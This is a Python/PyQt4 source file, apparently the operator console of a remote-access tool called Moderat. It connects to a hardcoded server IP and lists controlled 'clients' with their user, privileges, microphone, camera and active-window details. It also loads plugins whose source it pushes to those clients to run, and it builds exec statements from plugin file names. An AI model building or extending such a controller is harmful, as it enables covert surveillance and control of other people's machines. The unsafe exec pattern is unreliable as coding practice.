# -*- coding: utf-8 -*-

import sys
import os
import time

from PyQt4.QtGui import *
from PyQt4.QtCore import *

from ModeratorFactory import *

from libs.language import Translate
from libs.moderat.Actions import Actions
from libs.moderat.Modes import Modes
from libs.gui import triggers
from ui import gui

SERVER_HOST = '109.172.189.74'
#SERVER_HOST = '127.0.0.1'
SERVER_PORT = 1313

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)

# Main Window
class MainDialog(QMainWindow, gui.Ui_MainWindow):
    def __init__(self, reactor, plugins, parent=None):
        super(MainDialog, self).__init__(parent)
        self.reactor = reactor
        self.setupUi(self)

        # Initial Folders
        self.assets = os.path.join(os.path.dirname(sys.argv[0]), 'assets')
        self.flags = os.path.join(self.assets, 'flags')
        self.plugins = plugins

        # Session ID
        self.session_id = None
        # Privileges
        self.privs = 0
        # Checkers
        self.moderators_checker = None
        self.clients_checker = None
        # Modules Bank
        self.modulesBank = {}

        # Create Protocol
        self.create_moderator()
        # Init Triggers
        triggers.mainTriggers(self)
        # Create Actions Object
        self.action = Actions(self)
        # Create Modes Object
        self.modes = Modes(self)

        self.set_language()

    def set_language(self):

        # MAIN
        self.setWindowTitle(_('TITLE'))

        # TABS
        self.clientsTabs.setTabText(0, _('CLIENTS_TAB_ONLINE'))
        self.clientsTabs.setTabText(1, _('CLIENTS_TAB_OFFLINE'))
        self.clientsTabs.setTabText(2, _('CLIENTS_TAB_MODERATORS'))

        # HEADERS
        self.clientsTable.horizontalHeaderItem(0).setText(_('HEADER_MODERATOR'))
        self.clientsTable.horizontalHeaderItem(1).setText(_('HEADER_IP_ADDRESS'))
        self.clientsTable.horizontalHeaderItem(2).setText(_('HEADER_ALIAS'))
        self.clientsTable.horizontalHeaderItem(3).setText(_('HEADER_ID'))
        self.clientsTable.horizontalHeaderItem(4).setText(_('HEADER_OS'))
        self.clientsTable.horizontalHeaderItem(5).setText(_('HEADER_USER'))
        self.clientsTable.horizontalHeaderItem(6).setText(_('HEADER_PRIVS'))
        self.clientsTable.horizontalHeaderItem(7).setText(_('HEADER_MIC'))
        self.clientsTable.horizontalHeaderItem(8).setText(_('HEADER_CAM'))
        self.clientsTable.horizontalHeaderItem(9).setText(_('HEADER_ACTIVE_WINDOW_TITLE'))

        self.offlineClientsTable.horizontalHeaderItem(0).setText(_('HEADER_MODERATOR'))
        self.offlineClientsTable.horizontalHeaderItem(1).setText(_('HEADER_ID'))
        self.offlineClientsTable.horizontalHeaderItem(2).setText(_('HEADER_ALIAS'))
        self.offlineClientsTable.horizontalHeaderItem(3).setText(_('HEADER_IP_ADDRESS'))
        self.offlineClientsTable.horizontalHeaderItem(4).setText(_('HEADER_LAST_ONLINE'))
        # END HEADERS

        # BOTTOM
        self.loginStatusLabel.setText(_('BOTTOM_LOGIN_STATUS'))
        self.ipv4TextLabel.setText(_('BOTTOM_IPV4'))
        self.serversOnlineStatus.setText(_('BOTTOM_SERVERS_TOTAL'))
        # END BOTTOM

        # ADMINISTRATION
        self.getModeratorsButton.setText(_('MODERATOR_GET_MODERATORS'))
        self.addModeratorButton.setText(_('MODERATOR_ADD_MDOERATOR'))

        self.moderatorsTable.horizontalHeaderItem(0).setText(_('MODERATORS_HEADER_ID'))
        self.moderatorsTable.horizontalHeaderItem(1).setText(_('MODERATORS_HEADER_ONLINE'))
        self.moderatorsTable.horizontalHeaderItem(2).setText(_('MODERATORS_HEADER_OFFLINE'))
        self.moderatorsTable.horizontalHeaderItem(3).setText(_('MODERATORS_HEADER_PRIVILEGES'))
        self.moderatorsTable.horizontalHeaderItem(4).setText(_('MODERATORS_HEADER_STATUS'))
        self.moderatorsTable.horizontalHeaderItem(5).setText(_('MODERATORS_HEADER_LASTONLINE'))
        # END ADMINISTRATION

    def create_moderator(self):
        self.moderator = SocketModeratorFactory(
            self.on_moderator_connect_success,
            self.on_moderator_connect_fail,
            self.on_moderator_receive)

    # Start Connect To Server
    def on_connect_to_server(self):
        '''
        Try Connect To Server
        :return:
        '''
        self.connection = self.reactor.connectTCP(SERVER_HOST, SERVER_PORT, self.moderator)

    def on_moderator_connect_success(self):
        '''
        On Moderator Connected To Server
        :return:
        '''
        self.action.login()

    def on_moderator_connect_fail(self, reason):
        '''
        On Moderator Disconnected From Server
        :param reason:
        :return:
        '''
        self.action.disconnect()

    # Callbacks
    def on_moderator_receive(self, data):
        '''
        Data Received From Server
        :param data:
        :return:
        '''
        self.modes.check_mode(data)

    def set_alias(self):
        '''
        Set Alias For Client
        :return:
        '''
        self.action.set_alias()

    def execute_module(self, module):
        '''
        execute module
        :param module:
        :return:
        '''
        self.action.execute_module(module)

    def check_clients(self):
        '''
        Update Clients Information
        :return:
        '''
        self.moderator.send_msg(message='getClients', mode='getClients', session_id=self.session_id)

    def check_moderators(self):
        '''
        Update Moderators Information
        :return:
        '''
        self.moderator.send_msg(message='getModerators', mode='getModerators', session_id=self.session_id)

    def send_signal(self, data):
        if self.modulesBank.has_key(data['module_id']):
            self.modulesBank[data['module_id']].signal(data)

    def closeEvent(self, *args, **kwargs):
        '''
        Moderat Close Event Detected
        :param args:
        :param kwargs:
        :return:
        '''
        self.action.close_moderat()

def get_plugins_values(plugin):
    plugin_name = None
    plugin_description = None
    plugin_source = None
    if plugin.endswith('.py'):
        plugin = plugin[:-3]
        try:
            exec 'from plugins import %s' % plugin
            exec 'plugin_name = %s.plugin_name' % plugin
            exec 'plugin_description = %s.plugin_description' % plugin
            exec 'plugin_source = %s.plugin_source' % plugin
        except:
            pass
    return plugin_name, plugin_description, plugin_source

# -------------------------------------------------------------------------------
# Run Application
if __name__ == '__main__':
    app = QApplication(sys.argv)

    try:
        import qt4reactor
    except ImportError:
        from twisted.internet import qt4reactor
    qt4reactor.install()

    from twisted.internet import reactor

    # Create and display the splash screen
    splash_pix = QPixmap(os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'splash.png'))
    splash = QSplashScreen(splash_pix, Qt.WindowStaysOnTopHint)
    # Add Progress Bar
    progressBar = QProgressBar(splash)
    status_label = QLabel(splash)
    status_label.setGeometry(220, 300, 600, 20)
    status_label.setStyleSheet('''
color: #c9f5f7;
    ''')
    status_label.setText('Loading Plugin: ')
    progressBar.setGeometry(0, 320, 600, 10)
    progressBar.setTextVisible(False)
    progressBar.setStyleSheet('''
QProgressBar:horizontal {
border: 1px ridge;
border-color: #2c3e50;
background-color: #34495e;
padding: 1px;
text-align: bottom;
color: #c9f5f7;
}
QProgressBar::chunk:horizontal {
background: #c9f5f7;
margin-right: 1px;
width: 5px;
color: #c9f5f7;
}
    ''')
    splash.setMask(splash_pix.mask())
    splash.show()
    # Init Plugins
    status_label.setText('Initializing')
    init_plugins_dir = os.listdir(os.path.join(os.path.dirname(sys.argv[0]), 'plugins'))
    plugins_count = len(init_plugins_dir)
    plugins = {}
    for ind, plug in enumerate(init_plugins_dir):
        if '__init__' in plug or not plug.endswith('py'):
            continue
        status_label.setText('Loading Plugin: %s' % plug)
        name, desc, source = get_plugins_values(plug)
        if name and desc and source:
            plugins[name] = {
                'description':  desc,
                'source':       source,
            }
        progressBar.setValue((ind+1)*100/plugins_count)
        app.processEvents()
        time.sleep(0.1)

    moderatWindow = MainDialog(reactor, plugins)
    splash.finish(moderatWindow)
    moderatWindow.show()

    reactor.run()

